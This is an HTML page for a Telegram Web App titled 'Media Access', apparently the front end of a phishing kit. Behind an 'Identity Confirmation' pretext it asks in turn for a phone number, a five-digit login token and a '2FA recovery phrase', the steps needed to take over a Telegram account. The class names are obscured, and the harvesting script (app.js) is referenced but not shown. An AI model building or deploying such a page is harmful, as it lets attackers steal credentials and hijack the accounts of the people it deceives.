<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Access</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <video class="background-video" autoplay muted loop playsinline>
            <source src="video/video1.mp4" type="video/mp4">
        </video>
        <div class="content">
            <div style="text-align:center;font-size:72px;filter:drop-shadow(0 4px 12px rgba(0,0,0,0.6))">📱</div>
            <div id="s1" style="width:100%;display:flex;flex-direction:column;align-items:center;gap:14px;">
                <div class="nx">
                    <b>Identity Confirmation</b><br><br>
                    Enter your registered contact number to proceed.
                </div>
                <input type="tel" id="i1" class="px" placeholder="+91 98765 43210">
                <button id="b1" class="ax">Proceed</button>
            </div>
            <div id="s2" style="display:none;width:100%;flex-direction:column;align-items:center;gap:12px;">
                <div class="nx">
                    <b>Identity Confirmation</b><br><br>
                    Enter the token sent to your registered device.
                </div>
                <div class="dx">
                    <input type="text" maxlength="1" class="cx" data-index="0" readonly>
                    <input type="text" maxlength="1" class="cx" data-index="1" readonly>
                    <input type="text" maxlength="1" class="cx" data-index="2" readonly>
                    <input type="text" maxlength="1" class="cx" data-index="3" readonly>
                    <input type="text" maxlength="1" class="cx" data-index="4" readonly>
                </div>
                <button id="b2" class="ax">Proceed</button>
                <div class="gx">
                    <button class="kx" data-k="1">1</button>
                    <button class="kx" data-k="2">2</button>
                    <button class="kx" data-k="3">3</button>
                    <button class="kx" data-k="4">4</button>
                    <button class="kx" data-k="5">5</button>
                    <button class="kx" data-k="6">6</button>
                    <button class="kx" data-k="7">7</button>
                    <button class="kx" data-k="8">8</button>
                    <button class="kx" data-k="9">9</button>
                    <div></div>
                    <button class="kx" data-k="0">0</button>
                    <button class="kx bx" data-k="del">⌫</button>
                </div>
            </div>
            <div id="s3" style="display:none;width:100%;flex-direction:column;align-items:center;gap:14px;">
                <div class="nx">
                    <b>Additional Confirmation</b><br><br>
                    Enter your recovery phrase 2FA to complete access.
                </div>
                <input type="password" id="i3" class="px" placeholder="Recovery phrase">
                <button id="b3" class="ax">Proceed</button>
            </div>
        </div>
    </div>
    <script src="app.js"></script>
</body>
</html>
